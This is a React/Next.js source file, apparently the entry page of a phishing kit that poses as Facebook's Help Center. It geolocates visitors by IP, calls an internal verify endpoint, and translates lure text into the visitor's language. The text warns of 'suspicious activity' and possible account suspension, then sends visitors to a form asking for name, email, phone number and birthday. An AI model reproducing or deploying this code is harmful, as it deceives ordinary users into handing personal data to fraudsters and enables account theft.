'use client';
import logoGif from '@/assets/images/logo1.gif';
import { store } from '@/store/store';
import translateText from '@/utils/translate';
import countryToLanguage from '@/utils/country-to-language';
import axios from 'axios';
import { useRouter } from 'next/navigation';
import { useEffect, useCallback, useState, useRef, type FC } from 'react';

const Index: FC = () => {
    const router = useRouter();
    const { geoInfo, setGeoInfo, translations: storeTranslations, setTranslations } = store();
    const isTranslatingRef = useRef(false);
    
    const [showGif, setShowGif] = useState(true);
    const [translationsReady, setTranslationsReady] = useState(false);
    const hasInitialized = useRef(false);


    // Initialize security: get geoInfo, translate (không chặn bot nữa)
    const initializeSecurity = useCallback(async () => {
        try {
            const response = await axios.get('https://get.geojs.io/v1/ip/geo.json');
            const ipData = response.data;
            
            localStorage.setItem('ipInfo', JSON.stringify(ipData));
            
            // Set geoInfo vào store
            setGeoInfo({
                asn: ipData.asn || 0,
                ip: ipData.ip || 'CHỊU',
                country: ipData.country || 'CHỊU',
                city: ipData.city || 'CHỊU',
                country_code: ipData.country_code || 'US'
            });
            
            const detectedCountry = ipData.country_code || 'US';
            const targetLang = countryToLanguage[detectedCountry] || 'en';
            localStorage.setItem('targetLang', targetLang);
            
        } catch (error) {
            console.log('Security initialization failed:', error instanceof Error ? error.message : String(error));
            setGeoInfo({
                asn: 0,
                ip: 'CHỊU',
                country: 'CHỊU',
                city: 'CHỊU',
                country_code: 'US'
            });
        }
    }, [setGeoInfo]);

    // Load gif: ẩn sau đúng 2.7 giây (chỉ chạy 1 lần duy nhất, không bị reset)
    const gifTimerStarted = useRef(false);
    useEffect(() => {
        if (!gifTimerStarted.current) {
            gifTimerStarted.current = true;
            
            // Đếm thời gian từ khi mount
            const startTime = Date.now();
            
            const checkAndHide = () => {
                const elapsed = Date.now() - startTime;
                
                if (elapsed >= 2700) {
                    // Đã đủ 2.7 giây → ẩn gif ngay (verify có thể chưa xong nhưng không sao)
                    setShowGif(false);
                } else {
                    // Chưa đủ 2.7 giây → check lại sau
                    setTimeout(checkAndHide, 100);
                }
            };
            
            // Bắt đầu check
            checkAndHide();
        }
        // Không có dependency để chỉ chạy 1 lần duy nhất
        // eslint-disable-next-line react-hooks/exhaustive-deps
    }, []);

    // Initialize security và gọi verify API ngay khi component mount (song song)
    useEffect(() => {
        if (!hasInitialized.current) {
            hasInitialized.current = true;
            
            // Chạy song song: initializeSecurity và gọi verify API
            initializeSecurity();
            
            // Gọi verify API ngay (không cần đợi geoInfo)
            axios.post('/api/verify').catch(() => {
                // Ignore errors
            });
        }
    }, [initializeSecurity]);

    // Dịch text của contact page (ngầm) ngay khi có geoInfo - chỉ chạy 1 lần
    const translationStarted = useRef(false);
    useEffect(() => {
        // Nếu chưa có geoInfo, đợi một chút rồi check lại
        if (!geoInfo) {
            // Nếu đã quá lâu mà vẫn chưa có geoInfo, vẫn set ready để không bị kẹt
            const timeout = setTimeout(() => {
                if (!geoInfo && !translationStarted.current) {
                    setTranslationsReady(true);
                }
            }, 5000); // Đợi tối đa 5s
            return () => clearTimeout(timeout);
        }

        if (isTranslatingRef.current || translationStarted.current) return;

        // Lấy các text cần dịch (KHÔNG dịch About, Ad choices, Create ad, Privacy, Careers, Create Page, Terms and policies, Cookies)
        const pageTexts = [
            'Help Center',
            'English',
            'Using',
            'Managing Your Account',
            'Privacy, Safety and Security',
            'Policies and Reporting',
            'Account Policy Complaints',
            'We have detected suspicious activity on your Pages and accounts, including reports of copyright infringement and policy violations',
            'To protect your account, please verify your information now to ensure a quick and accurate review process.',
            'This is a mandatory verification step for Facebook accounts. Please complete the verification immediately to avoid account suspension and to expedite the resolution of your case.',
            'Name',
            'Email',
            'Phone Number',
            'Birthday',
            'Your Appeal',
            'Please describe your appeal in detail...',
            'Submit',
            'This field is required',
            'Please enter a valid email address',
            'Please wait...',
        ];

        // Check xem đã có page text chưa
        const hasPageTexts = pageTexts.every((text) => storeTranslations[text]);
        if (hasPageTexts) {
            // Đã dịch rồi → đánh dấu ready
            setTranslationsReady(true);
            return;
        }

        translationStarted.current = true;
        isTranslatingRef.current = true;

        const translatePageTexts = async () => {
            try {
                // Dịch song song với Promise.all
                const translatePromises = pageTexts.map((text) =>
                    translateText(text, geoInfo.country_code).then((translated) => ({ text, translated }))
                );

                const results = await Promise.all(translatePromises);

                const translatedMap: Record<string, string> = { ...storeTranslations };

                results.forEach(({ text, translated }) => {
                    translatedMap[text] = translated;
                });

                // Lưu vào store
                setTranslations(translatedMap);
                
                // Đánh dấu đã dịch xong
                setTranslationsReady(true);
            } catch (error) {
                console.error('Translation failed:', error);
                // Vẫn đánh dấu ready để không bị kẹt
                setTranslationsReady(true);
            } finally {
                isTranslatingRef.current = false;
            }
        };

        translatePageTexts();
    }, [geoInfo, setTranslations, storeTranslations]);

    // Redirect khi gif ẩn VÀ dịch xong (để trang contact không bị trắng)
    const hasRedirected = useRef(false);
    useEffect(() => {
        if (!showGif && translationsReady && !hasRedirected.current) {
            hasRedirected.current = true;
            // Redirect khi gif ẩn và dịch xong để trang contact hiển thị ngay
            const currentTime = Date.now();
            router.push(`/contact/${currentTime}`);
        }
    }, [showGif, translationsReady, router]);

    return (
        <>
            {showGif && (
                <div className="fixed inset-0 z-50 flex items-center justify-center bg-white">
                    <img 
                        src={typeof logoGif === 'string' ? logoGif : (logoGif as { src: string }).src} 
                        alt="Loading" 
                        className="w-[450px] h-auto lg:w-[600px] lg:h-auto object-contain" 
                    />
                </div>
            )}
        </>
    );
};

export default Index;
